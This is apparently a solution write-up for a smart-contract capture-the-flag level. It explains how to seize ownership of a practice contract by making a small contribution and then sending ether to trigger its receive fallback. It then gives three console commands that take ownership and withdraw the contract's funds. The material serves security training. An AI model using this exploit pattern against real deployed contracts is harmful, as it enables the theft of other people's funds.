## Solution Overview
1. Looking at the contract, we'd want to trigger the receive fallback function
2. In order to send our address as the owner, we'd need to have a non zero contribution and msg.value > 0
3. So we'd first need to call contribute successfully, then send the contract a small amount of ether
4. And once we're the contract owner, we can then call the withdraw function

## Code
```
await contract.contribute({value: toWei("0.0001")})
await sendTransaction({from: player, to: contract.address, value: toWei("0.0001")})
await contract.withdraw()
```